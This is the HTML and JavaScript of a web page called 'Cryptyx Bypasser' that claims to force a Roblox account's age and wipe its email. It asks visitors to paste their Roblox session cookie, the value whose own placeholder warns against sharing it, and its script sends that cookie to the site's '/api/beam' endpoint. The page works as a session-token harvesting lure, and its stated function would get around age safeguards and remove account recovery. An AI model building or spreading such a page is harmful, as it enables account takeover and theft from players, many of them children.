<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cryptyx Bypasser | Age Forcer & Email Wiper</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --neon-green: #00ff41;
            --bg-color: #050505;
            --panel-bg: rgba(5, 10, 5, 0.85);
            --text-main: #e0ffe0;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: 'Fira Code', monospace;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; overflow: hidden; position: relative;
        }
        .bg-grid {
            position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: linear-gradient(rgba(0, 255, 65, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 65, 0.05) 1px, transparent 1px);
            background-size: 50px 50px; transform: perspective(500px) rotateX(60deg);
            animation: moveGrid 10s linear infinite; z-index: -1;
        }
        @keyframes moveGrid { 0% { transform: perspective(500px) rotateX(60deg) translateY(0); } 100% { transform: perspective(500px) rotateX(60deg) translateY(50px); } }
        .glow {
            position: absolute; width: 60vw; height: 60vw;
            background: radial-gradient(circle, rgba(0, 255, 65, 0.15) 0%, transparent 60%);
            top: 50%; left: 50%; transform: translate(-50%, -50%);
            animation: pulse 4s ease-in-out infinite alternate; z-index: -1; pointer-events: none;
        }
        @keyframes pulse { 0% { opacity: 0.5; transform: translate(-50%, -50%) scale(0.8); } 100% { opacity: 1; transform: translate(-50%, -50%) scale(1.2); } }
        .container {
            background: var(--panel-bg); border: 1px solid rgba(0, 255, 65, 0.3); border-radius: 12px;
            padding: 40px; width: 100%; max-width: 480px;
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.1), inset 0 0 20px rgba(0, 255, 65, 0.05);
            backdrop-filter: blur(10px); position: relative;
        }
        .container::before {
            content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; border-radius: 12px;
            border: 1px solid transparent; background: linear-gradient(45deg, var(--neon-green), transparent, var(--neon-green)) border-box;
            -webkit-mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0); -webkit-mask-composite: destination-out; mask-composite: exclude; opacity: 0.3; pointer-events: none;
        }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 {
            font-family: 'Share Tech Mono', monospace; font-size: 2.1rem; color: var(--neon-green);
            text-shadow: 0 0 10px rgba(0, 255, 65, 0.7); letter-spacing: 1px; display: flex; align-items: center; justify-content: center; gap: 10px;
        }
        .header h1 svg { width: 28px; height: 28px; fill: var(--neon-green); animation: flash 2s infinite; }
        @keyframes flash { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .header p { font-size: 0.8rem; color: rgba(0, 255, 65, 0.6); letter-spacing: 4px; margin-top: 5px; text-transform: uppercase; }
        .form-group { margin-bottom: 20px; }
        label { display: block; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; color: rgba(0, 255, 65, 0.8); }
        input {
            width: 100%; background: rgba(0, 0, 0, 0.6); border: 1px solid rgba(0, 255, 65, 0.2);
            color: var(--neon-green); padding: 14px; border-radius: 6px; font-family: 'Fira Code', monospace;
            font-size: 0.9rem; outline: none; transition: all 0.3s ease;
        }
        input:focus { border-color: var(--neon-green); box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); }
        input::placeholder { color: rgba(0, 255, 65, 0.2); }
        .age-row { display: flex; gap: 15px; }
        .age-row .form-group { flex: 1; margin-bottom: 0; }
        .btn-container { margin-top: 30px; position: relative; }
        button {
            width: 100%; background: var(--neon-green); color: #000; border: none; padding: 16px;
            font-family: 'Share Tech Mono', monospace; font-size: 1.1rem; font-weight: 600;
            text-transform: uppercase; letter-spacing: 2px; border-radius: 6px; cursor: pointer;
            position: relative; overflow: hidden; transition: all 0.3s ease;
        }
        button:hover { background: #00cc33; box-shadow: 0 0 20px rgba(0, 255, 65, 0.5); }
        button:disabled { background: #1a1a1a; color: #555; cursor: not-allowed; box-shadow: none; border: 1px solid #333; }
        .btn-text { position: relative; z-index: 2; }
        .btn-loader { position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent); transition: 0.5s; }
        button.loading .btn-loader { animation: load 1s infinite; }
        @keyframes load { 0% { left: -100%; } 100% { left: 100%; } }
        .console {
            margin-top: 20px; background: #000; border: 1px solid rgba(0, 255, 65, 0.2); border-radius: 6px;
            padding: 15px; font-family: 'Share Tech Mono', monospace; font-size: 0.85rem; color: var(--neon-green);
            min-height: 80px; box-shadow: inset 0 0 10px rgba(0, 255, 65, 0.05); overflow-y: auto; max-height: 150px;
        }
        .console .line { margin-bottom: 5px; }
        .console .error { color: #ff3333; }
        .console .success { color: #00ff41; text-shadow: 0 0 5px #00ff41; }
        .console .info { color: #888; }
    </style>
</head>
<body>
    <div class="bg-grid"></div>
    <div class="glow"></div>
    <div class="container">
        <div class="header">
            <h1><svg viewBox="0 0 24 24"><path d="M13 2L3 14H12L11 22L21 10H12L13 2Z"/></svg>CRYPTYX BYPASSER</h1>
            <p>— Age Forcer & Email Wiper —</p>
        </div>
        <div class="form-group">
            <label>🔑 Roblox Cookie</label>
            <input type="password" id="cookie" placeholder="_|WARNING:-DO-NOT-SHARE..." required>
        </div>
        <div class="age-row">
            <div class="form-group"><label>📅 Day</label><input type="number" id="day" placeholder="1" value="1" min="1" max="31"></div>
            <div class="form-group"><label>📅 Month</label><input type="number" id="month" placeholder="1" value="1" min="1" max="12"></div>
            <div class="form-group"><label>📅 Year</label><input type="number" id="year" placeholder="2000" value="2000" min="1900" max="2020"></div>
        </div>
        <div class="btn-container">
            <button id="execute-btn" onclick="executeBeam()">
                <div class="btn-loader"></div>
                <span class="btn-text">⚡ Force Age + Remove Email ⚡</span>
            </button>
        </div>
        <div class="console" id="console"><div class="line info">⚡ Cryptyx Bypasser initialized. Awaiting input...</div></div>
    </div>
    <script>
        async function executeBeam() {
            const btn = document.getElementById('execute-btn');
            const consoleBox = document.getElementById('console');
            const cookie = document.getElementById('cookie').value.trim();
            const day = document.getElementById('day').value;
            const month = document.getElementById('month').value;
            const year = document.getElementById('year').value;
            if (!cookie) { logToConsole("[!] Error: Cookie is required.", "error"); return; }
            btn.disabled = true; btn.classList.add('loading'); btn.querySelector('.btn-text').innerText = "PROCESSING...";
            consoleBox.innerHTML = ""; logToConsole("[*] Connecting to Roblox API...", "info");
            try {
                const response = await fetch('/api/beam', {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookie, day, month, year })
                });
                const result = await response.json();
                if (result.success) {
                    result.data.messages.forEach(msg => {
                        if (msg.includes("successfully") || msg.includes("updated") || msg.includes("wiped")) { logToConsole(`[+] ${msg}`, "success"); } 
                        else { logToConsole(`[-] ${msg}`, "error"); }
                    });
                    logToConsole("[*] Process completed.", "info");
                } else { logToConsole(`[-] API Error: ${result.message}`, "error"); }
            } catch (error) { logToConsole(`[-] Network Error: ${error.message}`, "error"); } 
            finally { btn.disabled = false; btn.classList.remove('loading'); btn.querySelector('.btn-text').innerText = "⚡ Force Age + Remove Email ⚡"; }
        }
        function logToConsole(text, type) {
            const consoleBox = document.getElementById('console');
            const div = document.createElement('div');
            div.className = `line ${type}`; div.innerText = text;
            consoleBox.appendChild(div); consoleBox.scrollTop = consoleBox.scrollHeight;
        }
    </script>
</body>
</html>
